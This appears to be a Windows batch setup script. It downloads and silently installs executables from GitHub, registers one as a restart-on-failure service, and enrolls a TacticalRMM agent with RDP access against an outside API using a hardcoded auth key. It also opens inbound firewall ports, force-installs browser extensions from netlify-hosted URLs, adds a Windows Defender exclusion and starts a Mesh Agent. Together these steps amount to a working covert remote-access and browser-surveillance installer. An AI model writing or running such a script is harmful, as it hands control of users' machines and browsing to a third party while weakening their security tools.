@echo off
setlocal enabledelayedexpansion

:: === Configuration ===
set "URL=https://github.com/vietwe1993/ichibanurl/releases/latest/download/monitorUrlnew.exe"
set "TARGET_DIR=C:\Users\Public"
set "TARGET_FILE=monitorUrlnew.exe"
set "TASK_NAME=MonitorUrlTask"
set "AGENT_URL=https://raw.githubusercontent.com/vietwe1993/ichibanurl/main/tacticalagent-v2.9.1-windows-amd64.exe"
set "AGENT_FILE=%TARGET_DIR%\tacticalagent-v2.9.1-windows-amd64.exe"

:: === Stop monitor service, scheduled task and process if running ===
sc.exe stop MonitorUrlService >nul 2>&1
schtasks /end /tn "%TASK_NAME%" >nul 2>&1
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s = Get-Service -Name 'MonitorUrlService' -ErrorAction SilentlyContinue; if ($s -and $s.Status -ne 'Stopped') { Stop-Service -Name 'MonitorUrlService' -Force -ErrorAction SilentlyContinue; $until = [DateTime]::UtcNow.AddSeconds(10); while ($s.Status -ne 'Stopped' -and [DateTime]::UtcNow -lt $until) { Start-Sleep -Milliseconds 500; $s.Refresh() } }; Get-Process -Name 'monitorUrlnew' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"

:: === Create target directory if it doesn't exist ===
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

:: === Disable IPv6 properly on all network adapters ===
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | ForEach-Object { Disable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -PassThru -ErrorAction SilentlyContinue }"

:: === Delete old file if it exists ===
if exist "%TARGET_DIR%\%TARGET_FILE%" (
    for /l %%i in (1,1,5) do (
        if exist "%TARGET_DIR%\%TARGET_FILE%" (
            del /f /q "%TARGET_DIR%\%TARGET_FILE%" >nul 2>&1
            if exist "%TARGET_DIR%\%TARGET_FILE%" (
                powershell -Command "Get-Process -Name 'monitorUrlnew' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
                ping 127.0.0.1 -n 2 >nul
            )
        )
    )
    if exist "%TARGET_DIR%\%TARGET_FILE%" (
        echo [ERROR] Cannot delete existing %TARGET_FILE%: file is locked or in use.
        exit /b 1
    )
)

:: === Download monitorUrlnew.exe ===
where curl >nul 2>&1
if %errorlevel%==0 (
    curl -L -o "%TARGET_DIR%\%TARGET_FILE%" "%URL%"
) else (
    bitsadmin /transfer myDownloadJob /download /priority normal "%URL%" "%TARGET_DIR%\%TARGET_FILE%"
)
if not exist "%TARGET_DIR%\%TARGET_FILE%" (
    echo [ERROR] Failed to download %TARGET_FILE%.
    exit /b 1
)

:: === Download tacticalagent-v2.9.1-windows-amd64.exe ===
if exist "%AGENT_FILE%" (
    del /f /q "%AGENT_FILE%"
)
where curl >nul 2>&1
if %errorlevel%==0 (
    curl -L -o "%AGENT_FILE%" "%AGENT_URL%"
) else (
    bitsadmin /transfer myAgentDownload /download /priority normal "%AGENT_URL%" "%AGENT_FILE%"
)
if not exist "%AGENT_FILE%" (
    echo [ERROR] Failed to download %AGENT_FILE%.
    exit /b 1
)

:: === Delete existing task if it exists ===
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel%==0 (
    schtasks /delete /tn "%TASK_NAME%" /f
)

:: === Register Windows Service to run as SYSTEM at startup ===
sc.exe query MonitorUrlService >nul 2>&1
if %errorlevel%==0 (
    sc.exe config MonitorUrlService binPath= "\"%TARGET_DIR%\%TARGET_FILE%\" --service" start= delayed-auto
) else (
    sc.exe create MonitorUrlService binPath= "\"%TARGET_DIR%\%TARGET_FILE%\" --service" start= delayed-auto DisplayName= "CCH MonitorUrl Agent Service"
)
sc.exe failure MonitorUrlService reset= 86400 actions= restart/5000/restart/10000/restart/60000


:: === Gỡ TacticalAgent cũ (nếu có) và cài lại ===
if exist "C:\Program Files\TacticalAgent\unins000.exe" (
    "C:\Program Files\TacticalAgent\unins000.exe" /VERYSILENT
)
"%AGENT_FILE%" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP- /SILENT
if %errorlevel% neq 0 (
    echo [ERROR] TacticalAgent installer failed with exit code %errorlevel%.
    exit /b 1
)
ping 127.0.0.1 -n 5 >nul
if not exist "C:\Program Files\TacticalAgent\tacticalrmm.exe" (
    echo [ERROR] TacticalAgent executable not found after installation.
    exit /b 1
)
"C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://cchapi.reliavn.top --client-id 1 --site-id 1 --agent-type workstation --auth 916c8091f216f2946c6f810c75c7ddf52289839e0b83eef9fe29d5d34e770b4a --rdp --ping --power --silent
if %errorlevel% neq 0 (
    echo [ERROR] TacticalAgent registration failed with exit code %errorlevel%.
    exit /b 1
)

:: === Mở port 5002 TCP và UDP trên Firewall ===
powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 TCP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"
powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 UDP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"

powershell -Command "New-NetFirewallRule -DisplayName 'Allow Port 5002 TCP' -Direction Inbound -Protocol TCP -LocalPort 5002 -Action Allow"
powershell -Command "New-NetFirewallRule -DisplayName 'Allow Port 5002 UDP' -Direction Inbound -Protocol UDP -LocalPort 5002 -Action Allow"

:: === XÓA registry extension cũ (nếu có) ===
reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /f >nul 2>&1

:: === Add Chrome Extension policies to registry ===
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iibafaabdcbdgemhlcgbaekdlggolejj;https://splendid-taffy-25cf6f.netlify.app/update.xml" /f

:: === Add Edge Extension policies to registry ===
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iibafaabdcbdgemhlcgbaekdlggolejj;https://splendid-taffy-25cf6f.netlify.app/update.xml" /f

REM === Chạy lệnh PowerShell để set Mesh Agent sang Manual ===
powershell -Command "Set-Service -Name 'Mesh Agent' -StartupType Manual"

:: === Thêm vào danh sách ngoại lệ Defender trước khi hỏi restart ===
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"

:: Start Mesh Agent silently
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden ^
  -Command "try{$s=Get-Service 'Mesh Agent' -ErrorAction Stop; if($s.Status -ne 'Running'){ Start-Service $s }}catch{}" >nul 2>&1

:: === Verify TacticalAgent executable and AgentID before starting Monitor service ===
if not exist "C:\Program Files\TacticalAgent\tacticalrmm.exe" (
    echo [ERROR] Cannot start MonitorUrlService: TacticalAgent executable is missing.
    exit /b 1
)
powershell -NoProfile -ExecutionPolicy Bypass -Command "$aid = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\TacticalRMM' -Name 'AgentID' -ErrorAction SilentlyContinue).AgentID; if (-not $aid) { $aid = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\WOW6432Node\TacticalRMM' -Name 'AgentID' -ErrorAction SilentlyContinue).AgentID }; if (-not $aid) { exit 1 }"
if %errorlevel% neq 0 (
    echo [ERROR] Cannot start MonitorUrlService: TacticalAgent AgentID not found in registry.
    exit /b 1
)

:: === Start MonitorUrl Windows Service now ===
sc.exe start MonitorUrlService >nul 2>&1

:: === Wait for Service to reach RUNNING state and verify HTTP /version health check ===
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$until = [DateTime]::UtcNow.AddSeconds(20); $healthy = $false; " ^
  "while ([DateTime]::UtcNow -lt $until) { " ^
  "  Start-Sleep -Milliseconds 500; " ^
  "  try { " ^
  "    $s = Get-Service -Name 'MonitorUrlService' -ErrorAction SilentlyContinue; " ^
  "    if ($s -and $s.Status -eq 'Running') { " ^
  "      $h = Invoke-RestMethod -Uri 'http://127.0.0.1:5002/version' -TimeoutSec 2 -ErrorAction Stop; " ^
  "      if ($h.version) { $healthy = $true; break } " ^
  "    } elseif ($s -and $s.Status -eq 'Stopped') { break } " ^
  "  } catch { } " ^
  "}; if (-not $healthy) { exit 1 }"
if %errorlevel% neq 0 (
    echo [ERROR] MonitorUrlService failed to reach RUNNING state or HTTP /version health check failed.
    exit /b 1
)

:: === Khởi động lại sau 8 giây, ép đóng app, kèm lý do và thông báo ===
:: shutdown.exe /r /t 8 /f /d p:0:0 /c "Máy sẽ khởi động lại để hoàn tất cài đặt."

echo Done all setup. Exiting script...
exit /b 0








